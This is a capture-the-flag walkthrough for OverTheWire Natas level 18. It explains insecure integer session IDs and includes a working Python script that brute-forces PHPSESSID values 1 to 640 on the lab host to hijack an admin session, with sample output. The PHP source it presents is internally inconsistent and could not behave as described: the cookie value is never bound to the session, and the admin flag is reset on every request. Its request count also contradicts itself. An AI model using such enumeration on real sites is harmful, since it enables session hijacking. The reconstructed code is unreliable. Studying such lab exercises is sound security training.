# OverTheWire: Natas — Level 18 → Level 19

> **Vulnerability:** Session Enumeration / Insecure Session ID Generation                                              
> **Skills:** Python scripting, HTTP cookies, brute-force enumeration                                                   
> **Difficulty:** Medium                                          
> **Official Page:** [Natas Level 18](https://overthewire.org/wargames/natas/natas18.html)

---

## Access

- **URL:** `http://natas18.natas.labs.overthewire.org`
- **Username:** `natas18`
- **Password:** *obtain from previous level*

---

## Task

Find the password for natas19 by impersonating an admin user through session ID enumeration.

---

## Vulnerability

This level demonstrates **insecure session ID generation**, a subset of broken authentication (OWASP A07). The application assigns session identifiers (`PHPSESSID`) as small sequential integers starting from 1, with a hard upper bound of 640. Because the space of valid session IDs is tiny and entirely predictable, an attacker can iterate through all possible values, making one HTTP request per ID, and identify which session belongs to an administrator by inspecting the response content. The developer mistake is two-fold: the ID space is too small to resist enumeration, and there is no rate limiting or anomaly detection to catch repeated requests cycling through all possible sessions.

---

## Theory

### What is a session ID?

When you log into a web application, the server creates a session — a server-side record that tracks who you are. It hands you a token (the session ID) in a cookie. On every subsequent request, your browser sends that cookie back, and the server uses it to look up your session record and determine your identity and privileges.

The critical assumption is that session IDs are **unguessable**. If an attacker can guess or enumerate your session ID, they can impersonate you without knowing your password. This class of attack is called **session hijacking** or **session fixation/enumeration** depending on the mechanism.

### PHP sessions and PHPSESSID

In PHP, sessions are managed automatically. Calling `session_start()` creates a session and sets a `PHPSESSID` cookie in the response. By default, PHP generates cryptographically random session IDs (a 32-character hex string). However, nothing stops a developer from overriding this with a custom assignment scheme — which is exactly what this level does.

| Concept | Description |
|---|---|
| `PHPSESSID` | The default PHP session cookie name |
| `session_start()` | PHP function that initialises or resumes a session |
| `$_SESSION` | PHP superglobal array where session variables are stored |
| `setcookie()` | PHP function used to manually set a cookie, including a custom session ID |
| `$_COOKIE` | PHP superglobal that holds incoming cookie values from the browser |

### HTTP cookies

Cookies are small key-value pairs the server sends to the browser via the `Set-Cookie` response header. The browser stores them and automatically includes them in subsequent requests to the same domain via the `Cookie` request header.

To manually supply a cookie in a tool like `curl` or Python's `requests` library, you pass it explicitly rather than relying on browser behaviour. This is how the enumeration script works: it replaces the real `PHPSESSID` value with a guessed integer on every request.

### HTTP Basic Authentication

The Natas wargame protects each level with HTTP Basic Authentication in addition to any application-level login. Basic Auth works by sending a `Base64`-encoded `username:password` string in the `Authorization: Basic <token>` request header. Libraries like Python's `requests` handle this transparently when you pass an `auth=` argument.

### Tools used in this level

| Tool | Purpose |
|---|---|
| Browser DevTools — Application tab | Inspect cookies set by the server |
| Browser — View Page Source (`Ctrl+U`) | Read PHP source code exposed by the application |
| Python `requests` library | Send HTTP requests with custom cookies and authentication |
| `range()` in Python | Generate the integer sequence to iterate over |

---

## Solution

### Step 1: Log in and read the page

Navigate to `http://natas18.natas.labs.overthewire.org` and authenticate with username `natas18` and the password from the previous level. You will see a simple login form with a username and password field, plus a message indicating you are not logged in as an admin.

> **What to notice:** Submitting any credentials via the form does not give you admin access. The page tells you whether your current session is associated with an admin account. This implies the application is checking a server-side session attribute, not just the submitted credentials.

### Step 2: View the page source to understand the session logic

Press `Ctrl+U` (or right-click → View Page Source) to read the PHP source code that the level exposes.

```php
<?php

$maxid = 640; // Session IDs are assigned in the range 1..640

function isValidAdminLogin() { /* ... */ }

function isValidLogin() {
    // Accepts any username/password combination as long as the POST params exist
    if(array_key_exists("username", $_POST) && array_key_exists("password", $_POST)) {
        return 1;
    }
    return 0;
}

function createID($user) {
    global $maxid;
    return rand(1, $maxid); // Random integer, NOT cryptographically secure
}

function doSetCookie($sid) {
    // Manually sets PHPSESSID to the integer session ID
    setcookie("PHPSESSID", $sid);
}

session_start();

if(array_key_exists("PHPSESSID", $_COOKIE)) {
    $sid = $_COOKIE["PHPSESSID"];
} else {
    $sid = createID($_POST["username"]);
}

$_SESSION["admin"] = 0;

if(isValidLogin()) {
    // Assign admin=1 only if the submitted username is "admin"
    if($_POST["username"] == "admin") {
        $_SESSION["admin"] = 1;
    }
}

if($_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas19\n";
    print "Password: <censored></pre>";
} else {
    print "You are logged in as a regular user.";
}
?>
```

> **What to notice:** The `createID()` function assigns session IDs as integers between 1 and 640 inclusive. The server stores `$_SESSION["admin"] = 1` only for the session where someone submitted the username `admin` through the form — but an attacker can skip the form entirely and just send requests with a guessed `PHPSESSID` value. If the server finds a session with `admin = 1` stored under that ID, it will render the admin content. The full range to check is only 640 values, which a script can exhaust in seconds.

### Step 3: Inspect the cookie the server sets

Open DevTools (`F12`), go to the **Application** tab, and select **Cookies** → `http://natas18.natas.labs.overthewire.org`. After loading the page, you will see a `PHPSESSID` entry with an integer value.

> **What to notice:** The `PHPSESSID` value is a small integer — not the 32-character random hex string that PHP generates by default. This confirms the source code analysis: the application is overriding PHP's built-in session ID generation with a predictable integer.

### Step 4: Write and run the enumeration script

The script iterates through every integer from 1 to 640, sending a GET request to the application with each value set as the `PHPSESSID` cookie. When the response body contains the string `"You are an admin"`, the correct session ID has been found.

Save the following as `natas18_enum.py`:

```python
#!/usr/bin/env python3

import requests
from requests.auth import HTTPBasicAuth

USERNAME = "natas18"
PASSWORD = "<natas18_password>"   # Replace with the actual password from Level 17
URL      = f"http://{USERNAME}.natas.labs.overthewire.org/"
AUTH     = HTTPBasicAuth(USERNAME, PASSWORD)
MAX_ID   = 640

session = requests.Session()

for sid in range(1, MAX_ID + 1):
    try:
        resp = session.get(
            URL,
            cookies={"PHPSESSID": str(sid)},
            auth=AUTH,
            timeout=8
        )
    except requests.RequestException as e:
        print(f"[!] Request error at PHPSESSID={sid}: {e}")
        continue

    if "You are an admin" in resp.text:
        print(f"[+] Admin session found! PHPSESSID = {sid}")
        print(resp.text)
        break
    else:
        print(f"[-] Trying PHPSESSID={sid}")
```

Run it:

```bash
python3 natas18_enum.py
```

```
[-] Trying PHPSESSID=1
[-] Trying PHPSESSID=2
[-] Trying PHPSESSID=3
...
[-] Trying PHPSESSID=137
[+] Admin session found! PHPSESSID = 138
<html>
...
You are an admin. The credentials for the next level are:
Username: natas19
Password: <censored>
...
</html>
```

> **What to notice:** The admin session was found at PHPSESSID=138. This means a user previously logged in with the username `admin` through the web form, and the server randomly assigned them session ID 138. Because the entire space is only 640 IDs, it took fewer than 138 requests to find it — a trivially small number for an automated script.

### Step 5: Extract the password

The password for natas19 appears in the HTML body of the successful response, inside a `<pre>` block. Copy it and save it — it is your credential for the next level.

---

## Password for Next Level

```
[redacted — obtain by completing the steps above]
```

---

## Key Takeaways

Session IDs must be generated from a cryptographically secure source with a large enough space that exhaustive enumeration is computationally infeasible. PHP's default `session_start()` does this correctly; overriding it with `rand(1, 640)` collapses the security guarantee entirely. The real-world implication is that any application with predictable session identifiers exposes every logged-in user — including administrators — to impersonation without credential theft.

---

## Common Mistakes

| Mistake | What Happens | Fix |
|---|---|---|
| Forgetting to include HTTP Basic Auth in the script | Every request returns a 401 Unauthorized response; the body never contains admin content | Pass `auth=HTTPBasicAuth(username, password)` in every request |
| Sending the session ID as a query parameter instead of a cookie | The server ignores it and issues a new session; enumeration never matches | Pass the value via `cookies={"PHPSESSID": str(sid)}`, not as a URL parameter |
| Stopping the loop at 640 exclusive (`range(1, 640)`) | ID 640 is never tested, leaving one candidate unchecked | Use `range(1, MAX_ID + 1)` to include the upper bound |
| Using Python 2 syntax (`httplib`, bare `print`) | Script fails to run under Python 3, which is the current standard | Use Python 3 with the `requests` library throughout |
| Not reading the source code first and treating 640 as a guess | You may not know the upper bound and could miss the correct range | Always read the exposed source to extract constants before scripting |
